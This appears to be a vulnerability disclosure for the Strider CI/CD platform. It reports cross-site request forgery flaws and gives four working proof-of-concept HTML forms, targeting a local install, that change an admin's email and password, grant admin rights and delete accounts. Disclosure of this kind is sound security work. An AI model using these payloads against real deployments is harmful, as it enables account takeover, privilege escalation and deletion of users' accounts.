# Description

`Strider` is an Open Source Continuous Deployment / Continuous Integration platform. It is written in Node.js and Ember.js and uses MongoDB as a backing store. This platform is vulnerable to `Cross-Site Request Forgery (CSRF)`. It allowes an attacker to takeover accounts, privillege escalation and accounts deletion.

# Proof of Concept

1. Setup MongoDB
2. Install the package
```bash
git clone https://github.com/Strider-CD/strider.git
cd strider/apps/strider
npm i
node bin/strider addUser # add users accordingly
NODE_ENV=production npm start # start server
```
3. Login as admin
4. Use any of the CSRF POCs
# Change email
```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost:3000/api/account/email" method="POST">
      <input type="hidden" name="email" value="admin2&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
# Change password
```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost:3000/api/account/password" method="POST">
      <input type="hidden" name="password" value="hacked" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
# Privilege escalation
```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost:3000/admin/make_admin">
      <input type="hidden" name="user" value="user&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
# Account deletion
```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost:3000/admin/remove_user" method="POST">
      <input type="hidden" name="email" value="admin&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
